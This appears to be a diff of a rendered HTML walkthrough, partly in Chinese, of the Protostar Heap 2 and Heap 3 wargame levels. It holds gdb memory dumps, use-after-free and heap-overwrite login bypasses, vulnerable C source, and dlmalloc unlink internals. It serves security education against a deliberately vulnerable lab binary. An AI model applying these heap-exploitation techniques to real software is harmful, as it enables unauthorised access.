+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
 -------------------------------------------------
-0x804c000:  0x00000000  0x00000011  0x41414120  0x0000000a
-0x804c010:  0x00000000  0x00000011  0x42424220  0x0000000a
-0x804c020:  0x00000000  0x00000011  0x43434320  0x0000000a
-0x804c030:  0x00000000  0x00000fd1  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c000:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x41414120<span class="w">  </span>0x0000000a
+0x804c010:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x42424220<span class="w">  </span>0x0000000a
+0x804c020:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x43434320<span class="w">  </span>0x0000000a
+0x804c030:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000fd1<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c040:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
 --------auth-------------------------------------
 <span class="c1"># struct auth {</span>
 <span class="c1">#   char name[32];</span>
 <span class="c1">#   int auth;</span>
 <span class="c1"># };</span>
 <span class="c1"># 0x804c008 + 0x20 = 0x804c028</span>
-<span class="nv">$13</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\021\000\000\000 BBB\n\000\000\000\000\000\000\000\021\000\000&quot;</span>, <span class="nv">auth</span> <span class="o">=</span> <span class="m">1128481568</span><span class="o">}</span>  <span class="c1"># 0x43434320</span>
+<span class="nv">$13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot; AAA\n\000\000\000\000\000\000\000\021\000\000\000 BBB\n\000\000\000\000\000\000\000\021\000\000&quot;</span>,<span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1128481568</span><span class="o">}</span><span class="w">  </span><span class="c1"># 0x43434320</span>
 --------service----------------------------------
-<span class="nv">$14</span> <span class="o">=</span> 0x804c028 <span class="s2">&quot; CCC\n&quot;</span>
+<span class="nv">$14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c028<span class="w"> </span><span class="s2">&quot; CCC\n&quot;</span>
 -------------------------------------------------
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c028 <span class="o">]</span>
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c028<span class="w"> </span><span class="o">]</span>
 login
-you have logged <span class="k">in</span> already!
+you<span class="w"> </span>have<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span><span class="w"> </span>already!
 </code></pre></div>
 </li>
 <li>
 <p>由于动态分配大小错误，也可以直接覆盖</p>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r
-Starting program: /opt/protostar/bin/heap2 
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/heap2<span class="w"> </span>
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
-Current language:  auto
-The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently c&quot;</span>.
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
+Current<span class="w"> </span>language:<span class="w">  </span>auto
+The<span class="w"> </span>current<span class="w"> </span><span class="nb">source</span><span class="w"> </span>language<span class="w"> </span>is<span class="w"> </span><span class="s2">&quot;auto; currently c&quot;</span>.
 -------------------------------------------------
-0x804c000:  Cannot access memory at address 0x804c000
-<span class="o">(</span>gdb<span class="o">)</span> c
+0x804c000:<span class="w">  </span>Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x804c000
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-auth admin
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span>,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+auth<span class="w"> </span>admin
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
 -------------------------------------------------
-0x804c000:  0x00000000  0x00000011  0x696d6461  0x00000a6e
-0x804c010:  0x00000000  0x00000ff1  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c000:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x696d6461<span class="w">  </span>0x00000a6e
+0x804c010:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000ff1<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c020:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c030:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
+0x804c040:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
 --------auth-------------------------------------
-<span class="nv">$17</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot;admin\n\000\000\000\000\000\000\361\017&quot;</span>, <span class="s1">&#39;\000&#39;</span> &lt;repeats <span class="m">17</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">0</span><span class="o">}</span>
+<span class="nv">$17</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;admin\n\000\000\000\000\000\000\361\017&quot;</span>,<span class="w"> </span><span class="s1">&#39;\000&#39;</span><span class="w"> </span>&lt;repeats<span class="w"> </span><span class="m">17</span><span class="w"> </span>times&gt;,<span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="o">}</span>
 --------service----------------------------------
-<span class="nv">$18</span> <span class="o">=</span> 0x0
+<span class="nv">$18</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x0
 -------------------------------------------------
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-service AAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>AAAAAAAAAAAAAAAAAAAAAAAAAAA
 
-Breakpoint <span class="m">1</span>, 0x0804895f <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span> at heap2/heap2.c:20
-<span class="m">20</span>  <span class="k">in</span> heap2/heap2.c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804895f<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">argv</span><span class="o">=</span>0xbffff754<span class="o">)</span><span class="w"> </span>at<span class="w"> </span>heap2/heap2.c:20
+<span class="m">20</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>heap2/heap2.c
 -------------------------------------------------
-0x804c000:  0x00000000  0x00000011  0x696d6461  0x00000a6e
-0x804c010:  0x00000000  0x00000029  0x41414120  0x41414141
-0x804c020:  0x41414141  0x41414141  0x41414141  0x41414141
-0x804c030:  0x41414141  0x0000000a  0x00000000  0x00000fc9
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804c000:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000011<span class="w">  </span>0x696d6461<span class="w">  </span>0x00000a6e
+0x804c010:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000029<span class="w">  </span>0x41414120<span class="w">  </span>0x41414141
+0x804c020:<span class="w">  </span>0x41414141<span class="w">  </span>0x41414141<span class="w">  </span>0x41414141<span class="w">  </span>0x41414141
+0x804c030:<span class="w">  </span>0x41414141<span class="w">  </span>0x0000000a<span class="w">  </span>0x00000000<span class="w">  </span>0x00000fc9
+0x804c040:<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000<span class="w">  </span>0x00000000
 --------auth-------------------------------------
-<span class="nv">$19</span> <span class="o">=</span> <span class="o">{</span><span class="nv">name</span> <span class="o">=</span> <span class="s2">&quot;admin\n\000\000\000\000\000\000)\000\000\000 &quot;</span>, <span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">15</span> times&gt;, <span class="nv">auth</span> <span class="o">=</span> <span class="m">1094795585</span><span class="o">}</span>
+<span class="nv">$19</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;admin\n\000\000\000\000\000\000)\000\000\000 &quot;</span>,<span class="w"> </span><span class="s1">&#39;A&#39;</span><span class="w"> </span>&lt;repeats<span class="w"> </span><span class="m">15</span><span class="w"> </span>times&gt;,<span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1094795585</span><span class="o">}</span>
 --------service----------------------------------
-<span class="nv">$20</span> <span class="o">=</span> 0x804c018 <span class="s2">&quot; &quot;</span>, <span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">27</span> times&gt;, <span class="s2">&quot;\n&quot;</span>
+<span class="nv">$20</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c018<span class="w"> </span><span class="s2">&quot; &quot;</span>,<span class="w"> </span><span class="s1">&#39;A&#39;</span><span class="w"> </span>&lt;repeats<span class="w"> </span><span class="m">27</span><span class="w"> </span>times&gt;,<span class="w"> </span><span class="s2">&quot;\n&quot;</span>
 -------------------------------------------------
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c018 <span class="o">]</span>
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c018<span class="w"> </span><span class="o">]</span>
 login
-you have logged <span class="k">in</span> already!
+you<span class="w"> </span>have<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span><span class="w"> </span>already!
 </code></pre></div>
 </li>
 </ul>
 <h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="c1"># use after free</span>
-$ ./heap2
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-auth admin
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
+$<span class="w"> </span>./heap2
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span>,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+auth<span class="w"> </span>admin
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
 reset
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-service AAA
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c008 <span class="o">]</span>
-service BBB
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c018 <span class="o">]</span>
-service CCC
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c028 <span class="o">]</span>
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>AAA
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008<span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>BBB
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c018<span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>CCC
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c028<span class="w"> </span><span class="o">]</span>
 login
-you have logged <span class="k">in</span> already!
+you<span class="w"> </span>have<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span><span class="w"> </span>already!
 </code></pre></div>
 <div class="highlight"><pre><span></span><code><span class="c1"># simple overwrite</span>
-$ ./heap2
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-auth admin
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
-service AAAAAAAAAAAAAAAAAAAAAAA
-<span class="o">[</span> <span class="nv">auth</span> <span class="o">=</span> 0x804c008, <span class="nv">service</span> <span class="o">=</span> 0x804c018 <span class="o">]</span>
+$<span class="w"> </span>./heap2
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span>,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+auth<span class="w"> </span>admin
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>nil<span class="o">)</span><span class="w"> </span><span class="o">]</span>
+service<span class="w"> </span>AAAAAAAAAAAAAAAAAAAAAAA
+<span class="o">[</span><span class="w"> </span><span class="nv">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c008,<span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x804c018<span class="w"> </span><span class="o">]</span>
 login
-you have logged <span class="k">in</span> already!
+you<span class="w"> </span>have<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span><span class="w"> </span>already!
 </code></pre></div>
 <h2 id="heap-3">Heap 3<a class="headerlink" href="#heap-3" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>the Doug Lea Malloc (dlmalloc)</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;that wasn&#39;t too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;that wasn&#39;t too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">;</span>
 
-<span class="w">  </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+<span class="w">  </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+<span class="w">  </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
 
 <span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"> </span><span class="c1">// can&#39;t deal with null bytes</span>
-<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="w"></span>
-<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span><span class="w"></span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
 
-<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
 
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
@@ -3445,7 +3459,7 @@ you have logged <span class="k">in</span> already!
 <span class="w">  </span><span class="n">BK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span><span class="w">              </span>
 <span class="w">  </span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BK</span><span class="p">;</span><span class="w">             </span>
 <span class="w">  </span><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FD</span><span class="p">;</span><span class="w">             </span>
-<span class="p">}</span><span class="w"></span>
+<span class="p">}</span>
 </code></pre></div>
 </li>
 <li>
@@ -3477,13 +3491,13 @@ you have logged <span class="k">in</span> already!
 </li>
 <li>
 <p>fake chunk 的 next chunk 的 <code>prev_inuse</code> 位同样应为 0，从而能调用 <code>unlink</code></p>
-<div class="highlight"><pre><span></span><code><span class="n">nextinuse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">nextsize</span><span class="p">);</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="n">nextinuse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">nextsize</span><span class="p">);</span>
 
-<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">nextinuse</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">unlink</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">bck</span><span class="p">,</span><span class="w"> </span><span class="n">fwd</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="n">size</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">nextsize</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"></span>
-<span class="n">clear_inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">nextinuse</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">unlink</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">bck</span><span class="p">,</span><span class="w"> </span><span class="n">fwd</span><span class="p">);</span>
+<span class="w">  </span><span class="n">size</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">nextsize</span><span class="p">;</span>
+<span class="p">}</span><span class="w"> </span><span class="k">else</span>
+<span class="n">clear_inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
 </code></pre></div>
 </li>
 <li>
@@ -3493,107 +3507,107 @@ you have logged <span class="k">in</span> already!
 <p>查看相关地址信息</p>
 <details class="note">
 <summary>Dump of assembler code for function main</summary>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
-<span class="o">(</span>gdb<span class="o">)</span> disassemble main
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-0x08048889 &lt;main+0&gt;:    push   ebp
-0x0804888a &lt;main+1&gt;:    mov    ebp,esp
-0x0804888c &lt;main+3&gt;:    and    esp,0xfffffff0
-0x0804888f &lt;main+6&gt;:    sub    esp,0x20
-0x08048892 &lt;main+9&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x20
-0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
-0x0804889e &lt;main+21&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>,eax
-0x080488a2 &lt;main+25&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x20
